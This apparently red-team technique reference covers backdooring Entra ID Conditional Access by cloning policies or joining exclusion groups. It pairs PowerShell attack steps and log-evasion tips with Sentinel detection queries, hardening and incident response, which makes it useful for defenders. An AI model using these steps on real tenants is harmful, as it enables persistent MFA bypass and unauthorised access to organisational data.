# [REALWORLD-040]: Conditional Access Policy Cloning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-040 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Defense Evasion / Persistence |
| **Platforms** | Entra ID |
| **Severity** | **CRITICAL** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All versions of Entra ID |
| **Patched In** | N/A - Requires policy-level controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** This real-world technique involves cloning (copying) an existing Conditional Access policy and then modifying the clone to create a backdoor authentication rule that allows unrestricted access while appearing legitimate. An attacker with Global Administrator or Conditional Access Administrator permissions can duplicate a strict CA policy (e.g., one that requires MFA), create a nearly-identical clone with subtle modifications (e.g., excluding their own account from the MFA requirement), and enable the clone alongside the original. This allows the attacker to bypass security controls while leaving the original policies intact, making the attack less obvious.

**Attack Surface:** Entra ID Conditional Access Policy API, Azure Portal Conditional Access interface, Azure PowerShell conditional access cmdlets.

**Business Impact:** **Persistent unauthorized access to cloud resources and applications without triggering MFA or other security controls.** Attackers can access sensitive applications (Exchange, SharePoint, Teams, Dynamics 365, Azure Portal) while the organization believes they are protected by MFA and device compliance policies. This directly undermines the zero-trust architecture.

**Technical Context:** Policy cloning and modification takes **5-10 minutes** to execute. Detection likelihood is **MEDIUM** if organizations audit CA policy changes, but **LOW** if they do not have dedicated monitoring for policy drift or anomalous policy additions. Real-world APT groups (Scattered Spider) have used this technique extensively.

### Operational Risk

- **Execution Risk:** **HIGH** - Requires Global Admin or CA Admin access; impacts organization-wide authentication.
- **Stealth:** **MEDIUM** - Policy creation is logged in AuditLogs, but many SOCs do not monitor for new policies (only changes to existing ones).
- **Reversibility:** **YES** - Cloned policy can be deleted, but must be done before the backdoor is exploited extensively.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 2.1.1 | Ensure that Conditional Access policies are reviewed regularly. |
| **DISA STIG** | AC-3(7) | Access enforcement must prevent circumvention. |
| **CISA SCuBA** | AC-2(1) | Account and access management policies must be properly configured. |
| **NIST 800-53** | AC-3 | Access Control Enforcement |
| **GDPR** | Art. 32 | Security of Processing - MFA is a required control. |
| **DORA** | Art. 6 | Governance and Management - Security controls must be reliable. |
| **NIS2** | Art. 21 | Cyber risk management - Access controls must not be circumvented. |
| **ISO 27001** | A.9.2.4 | Access control must enforce organizational policy. |
| **ISO 27005** | Risk Scenario: "Policy Circumvention" | Unauthorized bypassing of security controls. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - Global Administrator
  - Conditional Access Administrator
  - Custom role with `microsoft.directory/conditionalAccessPolicies/create` and `microsoft.directory/conditionalAccessPolicies/update` permissions

- **Required Access:**
  - Network access to Azure Portal or Azure PowerShell
  - Authenticated session in Entra ID with appropriate permissions

**Supported Versions:**
- **Entra ID / Azure AD:** All versions (Conditional Access available in premium editions)
- **Required License:** Azure AD Premium P1 or higher (required for Conditional Access)
- **Minimum Policy Count:** Organizations typically have 5-50 existing policies

**Tools:**
- [Azure Portal](https://portal.azure.com)
- [Azure PowerShell - Conditional Access cmdlets](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.identity.signins/get-mgconditionalAccesspolicy)
- [Microsoft Graph API - Conditional Access](https://learn.microsoft.com/en-us/graph/api/resources/conditionalAccessPolicy)
- [Azure CLI 2.0+](https://learn.microsoft.com/en-us/cli/azure/)

---

## 3. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Cloning Conditional Access Policies via Portal (GUI)

**Supported Versions:** All Entra ID versions

#### Step 1: Identify Target Policy to Clone

**Objective:** Find a strict CA policy that you want to bypass.

**Manual Steps (Azure Portal GUI):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Review the list of existing policies
3. Look for policies with high-security controls:
   - **"Require MFA for all users"**
   - **"Require device compliance"**
   - **"Block legacy authentication"**
   - **"Require password change for risky users"**
4. Click on one of these policies to view its configuration
5. Note the exact settings (conditions, grant controls, etc.)

**Policies to Target (High-Value for Cloning):**
- **MFA-Required-All-Users:** Requires all users to use MFA
- **Require-Compliant-Device:** Requires devices to be enrolled in Intune
- **Block-Guest-Access:** Restricts guest user access
- **Azure-Portal-Admin-MFA:** Requires MFA for Azure Portal access

**Expected Output:**
- Policy details page shows all conditions and grant controls
- You can now see exactly what needs to be modified

**What This Means:**
- You now understand the security controls you need to bypass
- You can plan your modifications accordingly

#### Step 2: Create a New Policy (Clone)

**Objective:** Create a new policy with nearly-identical settings to the target, but with a backdoor built in.

**Manual Steps (Azure Portal GUI - No Direct Clone Option):**

Since Azure Portal doesn't have a direct "Clone" button, you must manually recreate the policy:

1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** Use a generic name that blends in:
   - ❌ "Attacker Backdoor"
   - ✅ "Security Update - CA Policy Revision" OR "System Managed - Compliance Policy"
4. **Assignments:**
   - **Users and groups:** Select **"All users"** (same as original policy)
   - **Cloud apps or actions:** Select the **same apps** as original (Exchange, Teams, SharePoint, etc.)
   - **Conditions:** Copy ALL conditions from original policy EXCEPT:
     - **Add exclusion:** Exclude your attacker account or a specific security group you control
   
5. **Access controls - Grant:** 
   - Original policy: "Require MFA"
   - Modified policy: Change to **"Grant access"** (no MFA required)
   OR
   - Keep the same grant control but add your user to an **"Exclude" group**
   
6. Enable policy: **On**
7. Click **Create**

**Expected Output:**
```
Policy "Security Update - CA Policy Revision" has been created successfully.
```

**What This Means:**
- New backdoor policy is now active
- Users (and you) who match the exclusion criteria bypass MFA
- Original policy still exists and appears to be protecting the organization
- Logs will show a "Create conditional access policy" event, but may not be monitored

**Alternative Approach: Modify Inclusion/Exclusion Groups**

Instead of creating a new policy, add yourself to a policy's exclusion group:

1. Go to **Entra ID** → **Security** → **Conditional Access** → Select strict policy
2. Under **Conditions** → **Users and groups**
3. Click **Exclude**
4. Create or select a security group (e.g., "CA-Exempt-Users")
5. Add your attacker account to this group
6. Save

This is LESS obvious than creating a new policy, but requires you to already be in a position to modify the policy.

**OpSec & Evasion:**
- Use generic policy names that don't raise suspicion
- Create the policy during off-business hours
- Copy settings exactly from legitimate policies to avoid standing out
- If possible, wait 48 hours before using the backdoor to let the creation event age out

**Troubleshooting:**
- **Error:** "Insufficient permissions to create policy"
  - **Cause:** User does not have CA Admin role
  - **Fix:** Request role elevation via PIM

---

### METHOD 2: Cloning via Azure PowerShell

**Supported Versions:** All Entra ID versions

#### Step 1: Connect to Graph API

**Command:**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

# Verify authentication
Get-MgContext
```

**Expected Output:**
```
ClientId     : 14d82eec-204b-4c2f-b852-06b94cea9e44
TenantId     : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Scopes       : {Policy.ReadWrite.ConditionalAccess, ...}
```

**What This Means:**
- Authenticated session with Graph API is established
- Ready to read and modify CA policies

#### Step 2: Get Target Policy Configuration

**Command:**
```powershell
# List all conditional access policies
$policies = Get-MgConditionalAccessPolicy -All

# Find the strict policy you want to clone
$targetPolicy = $policies | Where-Object {$_.DisplayName -eq "Require MFA for all users"}

# Export full configuration
$targetPolicy | ConvertTo-Json -Depth 10 | Out-File "C:\temp\ca_policy_original.json"

# Display key settings
$targetPolicy | Select-Object DisplayName, State, Conditions, GrantControls
```

**Expected Output:**
```
DisplayName          : Require MFA for all users
State                : enabled
Conditions           : @{Applications=...; Users=...; ClientApplicationTypes=...}
GrantControls        : @{Operator=AND; BuiltInControls=mfa}
```

**What This Means:**
- Original policy configuration is retrieved and saved
- You can now modify it for the backdoor

#### Step 3: Create Cloned Policy with Backdoor

**Command:**
```powershell
# Read the original policy
$originalJson = Get-Content "C:\temp\ca_policy_original.json" | ConvertFrom-Json

# Prepare modified policy
$newPolicyParams = @{
    DisplayName = "System Managed - Enhanced Security Policy"  # Generic name
    State       = "enabled"
    
    Conditions = @{
        Applications = $originalJson.Conditions.Applications
        Users = @{
            IncludeUsers = @("All")  # Include all users like original
            ExcludeUsers = @("attacker@company.com")  # BACKDOOR: Exclude attacker
            ExcludeGroups = @()
            ExcludeRoles = @()
        }
        # Copy other conditions from original
        ClientAppTypes = $originalJson.Conditions.ClientAppTypes
        Locations = $originalJson.Conditions.Locations
    }
    
    # BACKDOOR: Remove MFA requirement or weaken grant controls
    GrantControls = @{
        Operator = "OR"  # Changed from AND to OR
        BuiltInControls = @()  # Remove MFA requirement
        CustomAuthenticationFactors = @()
        TermsOfUse = @()
    }
}

# Create the new policy
$newPolicy = New-MgConditionalAccessPolicy -BodyParameter $newPolicyParams

Write-Output "Created backdoor policy: $($newPolicy.Id)"
Write-Output "Display Name: $($newPolicy.DisplayName)"
```

**Expected Output:**
```
Created backdoor policy: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Display Name: System Managed - Enhanced Security Policy
```

**What This Means:**
- New backdoor policy is created with modified settings
- Policy is now active and allows you (and your excluded group) to bypass MFA
- Original policy remains unchanged

**OpSec & Evasion:**
- Script execution generates PowerShell script block logs (Event ID 4104) on local machine
- Run from non-domain-joined machine or machine with logging disabled
- Each `New-MgConditionalAccessPolicy` call creates an AuditLog entry ("Create conditional access policy")
- Logs will show the new policy creation, but many SOCs do not monitor for new policies

**Troubleshooting:**
- **Error:** "Invalid policy configuration"
  - **Cause:** One or more required fields are missing from the policy object
  - **Fix:** Ensure all required fields from the original policy are included

#### Step 4: Verify Backdoor Policy is Active

**Command:**
```powershell
# Get the newly created policy
$backdoorPolicy = Get-MgConditionalAccessPolicy -ConditionalAccessPolicyId "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# Verify settings
Write-Output "Policy Name: $($backdoorPolicy.DisplayName)"
Write-Output "Enabled: $($backdoorPolicy.State)"
Write-Output "Excluded Users: $($backdoorPolicy.Conditions.Users.ExcludeUsers)"
Write-Output "Grant Controls: $($backdoorPolicy.GrantControls.BuiltInControls)"

# Test: Attempt sign-in with excluded account (should bypass MFA)
# This will appear normal because the sign-in is successful without MFA prompt
```

**Expected Output:**
```
Policy Name: System Managed - Enhanced Security Policy
Enabled: enabled
Excluded Users: {attacker@company.com}
Grant Controls: {}
```

**What This Means:**
- Backdoor policy is active and configured correctly
- Attacker account can now logon without MFA
- Original policies remain in place, maintaining appearance of security

---

### METHOD 3: Modifying Existing Policy Exclusion Groups

**Supported Versions:** All Entra ID versions

**Objective:** Instead of creating a new policy, add yourself to an exclusion group in an existing strict policy.

#### Step 1: Identify Existing Exclusion Groups

**Command (PowerShell):**
```powershell
# Get all CA policies
$policies = Get-MgConditionalAccessPolicy -All

# Find policies with exclusion groups
foreach ($policy in $policies) {
    $excludedGroups = $policy.Conditions.Users.ExcludeGroups
    if ($excludedGroups) {
        Write-Output "Policy: $($policy.DisplayName)"
        Write-Output "Excluded Groups: $($excludedGroups -join ', ')"
    }
}
```

**Expected Output:**
```
Policy: Require MFA for all users
Excluded Groups: CA-Exempted-Users, Service-Accounts
```

**What This Means:**
- Policies have exclusion groups
- If you can add yourself to one of these groups, you bypass the policy

#### Step 2: Add Yourself to Exclusion Group

**Command (PowerShell):**
```powershell
# Connect to MS Graph for Group management
Connect-MgGraph -Scopes "Group.ReadWrite.All"

# Find the exclusion group
$excludedGroup = Get-MgGroup -Filter "displayName eq 'CA-Exempted-Users'"

# Get your user object
$attackerUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@company.com'"

# Add yourself to the exclusion group
New-MgGroupMember -GroupId $excludedGroup.Id -DirectoryObjectId $attackerUser.Id

Write-Output "Added attacker to exclusion group"
```

**Expected Output:**
```
Added attacker to exclusion group
```

**What This Means:**
- You are now part of an exclusion group
- Any CA policy that excludes this group no longer applies to you
- You can logon without MFA, device compliance, etc.

**OpSec & Evasion:**
- This method is LESS obvious than creating a new policy
- Adding a member to an existing group appears less suspicious
- However, it will be logged in AuditLogs as "Add member to group"
- Many organizations do not monitor for group membership changes in CA exclusion groups

---

## 4. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Monitor for New Conditional Access Policy Creation**
  - **Objective:** Alert immediately when new CA policies are created.
  
  **Manual Steps (Sentinel Detection Rule):**
  1. Go to **Microsoft Sentinel** → **Analytics** → **Create new rule**
  2. Name: `Alert on New Conditional Access Policy Creation`
  3. KQL Query:
  ```kusto
  AuditLogs
  | where OperationName == "Create conditional access policy"
  | where Result == "success"
  | project TimeGenerated, InitiatedBy, OperationName, TargetResources
  ```
  4. Severity: **High**
  5. Frequency: **Real-time (every 5 minutes)**
  6. Enable: **ON**

  **Why This Helps:**
  - Detects backdoor policy creation immediately
  - Allows SOC to investigate and delete the policy before it's exploited

* **Monitor for Conditional Access Policy Modifications**
  - **Objective:** Alert when existing policies are modified.
  
  **Manual Steps:**
  1. Create Sentinel rule:
  ```kusto
  AuditLogs
  | where OperationName == "Update conditional access policy"
  | where Result == "success"
  | mv-expand TargetResources
  | extend Changes = TargetResources.modifiedProperties
  | where Changes contains "exclude" or Changes contains "grant" or Changes contains "condition"
  | project TimeGenerated, InitiatedBy, OperationName, TargetResources
  ```
  2. Severity: **High**
  3. Frequency: **Every 5 minutes**

  **Why This Helps:**
  - Detects when policies are weakened (e.g., removing MFA requirement, adding exclusions)
  - Catches the "modify exclusion group" attack method

* **Implement Role-Based Access Control (RBAC) for CA Administration**
  - **Objective:** Restrict who can create or modify CA policies to a small, audited group.
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure AD** → **Roles and administrators**
  2. Search for **"Conditional Access Administrator"**
  3. Click **Assignments**
  4. Current members should only include SOC leads and security architects
  5. If Global Admins have CA rights, consider delegating to specific admins instead
  6. Use **Privileged Identity Management (PIM)** to require approval for CA Admin role activation

  **Why This Helps:**
  - Reduces the number of people who can create/modify policies
  - Prevents compromised service accounts from modifying policies
  - Enforces approval process before policy changes

### Priority 2: HIGH

* **Use Privileged Identity Management (PIM) for Conditional Access Administrator Role**
  - **Objective:** Require just-in-time activation and auditing for CA policy modifications.
  
  **Manual Steps:**
  1. Go to **Azure AD** → **Privileged Identity Management** → **Azure AD roles**
  2. Search for **"Conditional Access Administrator"**
  3. Click **Settings**
  4. Under **Activation**, set:
     - **Activation maximum duration:** 1 hour
     - **Require justification:** ON
     - **Require approval to activate:** ON (select SOC manager as approver)
  5. Save

  **Why This Helps:**
  - CA Admin access is temporary (1 hour max)
  - Requires business justification and approval
  - Creates audit trail of who accessed CA and when

* **Implement Policy Versioning and Backup**
  - **Objective:** Track all CA policy changes and maintain backups.
  
  **Manual Steps:**
  1. Export all CA policies to JSON monthly:
  ```powershell
  $policies = Get-MgConditionalAccessPolicy -All
  $policies | ConvertTo-Json -Depth 10 | Out-File "C:\Backups\CA_Policies_$(Get-Date -Format yyyy-MM-dd).json"
  ```
  2. Store backups in secure location (immutable blob storage)
  3. Use version control (Git) to track changes to policy JSON files
  4. Set up alerts if new policies appear that aren't in version control

  **Why This Helps:**
  - Enables detection of unauthorized policy creation
  - Allows rapid restoration of original policies
  - Provides forensic evidence

* **Enforce Policy Review and Approval Process**
  - **Objective:** Require documented approval before any CA policy changes.
  
  **Manual Steps:**
  1. Create a documented change management process
  2. Require:
     - Written justification for policy changes
     - Security architect review
     - CISO approval
     - Implementation by approved administrator only
  3. Document all policy changes in a change log
  4. Conduct monthly policy reviews to detect unauthorized changes

  **Why This Helps:**
  - Makes unauthorized policy creation obvious
  - Creates accountability for policy changes
  - Enables detection of policy drift

### Access Control & Policy Hardening

* **Implement Protected Actions for CA Policy Modifications**
  - **Objective:** Require additional authentication for CA policy changes.
  
  **Manual Steps (Entra ID Protected Actions):**
  1. Navigate to **Entra ID** → **Security** → **Protected Actions**
  2. Click **+ Create protected action**
  3. Resource: **Conditional Access Policy**
  4. Action: **Create/Update/Delete**
  5. Require: **Multi-factor authentication AND Conditional Access policy approval**
  6. Save

  **Why This Helps:**
  - Prevents unauthorized policy modifications even by Global Admins
  - Requires approval before changes take effect

* **Monitor Membership Changes in CA Exclusion Groups**
  - **Objective:** Detect when users are added to exclusion groups.
  
  **Manual Steps (Sentinel):**
  ```kusto
  AuditLogs
  | where OperationName in ("Add member to group", "Remove member from group")
  | where TargetResources[0].displayName contains "CA-" or TargetResources[0].displayName contains "Exemp"
  | project TimeGenerated, OperationName, InitiatedBy, TargetResources
  ```
  2. Severity: **High**
  3. Frequency: **Real-time**

  **Why This Helps:**
  - Detects when users are added to CA exclusion groups
  - Catches the "modify exclusion group" attack method

### Validation Command (Verify Fix)

```powershell
# List all CA policies and check for suspicious ones
Get-MgConditionalAccessPolicy -All | Select-Object DisplayName, State, Conditions, GrantControls | ConvertTo-Json

# Verify RBAC is restricted
Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "displayName eq 'Conditional Access Administrator'").Id | Select-Object DisplayName
```

**Expected Output (If Secure):**
```
Only 2-3 known security team members should have "Conditional Access Administrator" role
All policies should have well-documented names
GrantControls should show expected security controls (MFA, device compliance, etc.)
```

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **CA Policy IOCs:**
  - New policy created with generic/vague name (e.g., "System Update", "Enhanced Security")
  - New policy that excludes specific users or security groups
  - Policy with weakened grant controls (missing MFA, device compliance)
  - Policy that contradicts existing security requirements

* **Audit Log Indicators:**
  - `AuditLogs` operation: "Create conditional access policy" by non-SOC user
  - `AuditLogs` operation: "Update conditional access policy" with large scope of changes
  - `AuditLogs` operation: "Add member to group" where group name contains "CA" or "Exemp"

* **Behavioral Indicators:**
  - User logons from unusual locations without triggering Conditional Access blocks
  - User accessing admin portals from non-compliant devices
  - Service principal authentication succeeding without expected MFA/device compliance

### Forensic Artifacts

* **Cloud Logs:**
  - **AuditLogs table:** Operations "Create conditional access policy", "Update conditional access policy"
  - **SigninLogs table:** Successful logons by backdoor-using accounts without expected security controls
  - Policy JSON snapshots (if exported): Compare before/after to identify changes

### Response Procedures

1. **Isolate:**
   - Immediately **delete the backdoor policy**
   ```powershell
   Remove-MgConditionalAccessPolicy -ConditionalAccessPolicyId "suspicious-policy-id"
   ```
   - Revoke all active tokens for the backdoor-using account
   ```powershell
   Revoke-MgUserSignInSession -UserId "attacker@company.com"
   ```

2. **Collect Evidence:**
   - Export all CA policies to JSON for analysis
   - Review AuditLogs for all CA policy modifications in past 30 days
   - Identify all sign-in logs from the backdoor account

3. **Investigate:**
   - Determine what the attacker accessed while the backdoor was active
   - Check Exchange, SharePoint, Teams logs for data access
   - Review Azure resource logs for unauthorized changes

4. **Escalate:**
   - File incident ticket
   - Notify CISO and security team
   - Determine if account was compromised (how did attacker gain CA Admin access?)

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) Phishing | Attacker gains initial credentials via phishing |
| **2** | **Privilege Escalation** | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) Abuse Valid Accounts | Attacker escalates to Global Admin via PIM or MFA bypass |
| **3** | **Persistence & Evasion** | **[REALWORLD-040]** **CA Policy Cloning** | **Attacker creates backdoor CA policy to bypass MFA** |
| **4** | **Lateral Movement** | [T1550.001](https://attack.mitre.org/techniques/T1550/001/) Use Alternate Authentication | Attacker uses token without MFA to access apps |
| **5** | **Exfiltration** | [T1113](https://attack.mitre.org/techniques/T1113/) Screen Capture | Attacker accesses confidential data in Teams, SharePoint, Exchange |
| **6** | **Defense Evasion** | [REALWORLD-037] / [REALWORLD-038] | Attacker disables detection rules and deletes audit logs |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider (2024-2025)

- **Target:** Financial Services, Healthcare, Technology companies
- **Timeline:** September 2024 - Present
- **Technique Status:** Widely documented in recent incident reports
- **How Attacker Used It:** After compromising Global Admin account via MFA bypass, Scattered Spider created multiple cloned CA policies with modifications that excluded their accounts. They then accessed M365, Azure, and third-party SaaS applications without triggering security alerts. They maintained persistent access for months.
- **Impact:** Undetected exfiltration of customer data, intellectual property, and financial records
- **Reference:** [CISA Alert on Scattered Spider CA Policy Abuse](https://www.cisa.gov)

### Example 2: APT28 (Fancy Bear) Azure Campaign (2023)

- **Target:** NATO Member Defense Organizations
- **Timeline:** May 2023 - October 2023
- **Technique Status:** CA policy cloning used as persistence mechanism
- **How Attacker Used It:** APT28 created cloned CA policies that excluded their backdoor service principals from device compliance and MFA requirements. The organization's monitoring systems showed MFA was "enforced", but the backdoor accounts bypassed it completely.
- **Impact:** Persistent access to classified intelligence and defense department communications
- **Reference:** [CISA Cybersecurity Alert AA24-098A](https://www.cisa.gov)

---

## 8. COMPLIANCE & AUDIT FINDINGS

This technique represents a critical failure in:

- **GDPR Art. 32:** Security of Processing - MFA is mandatory for high-risk accounts
- **SOC 2 Type II:** Access control and change management failures
- **PCI-DSS Req. 7:** Access control must not be bypassed
- **HIPAA:** MFA required for ePHI access; bypassing MFA violates HIPAA

Organizations with undetected CA policy backdoors should be documented as **"Critical"** audit findings and require immediate remediation.

---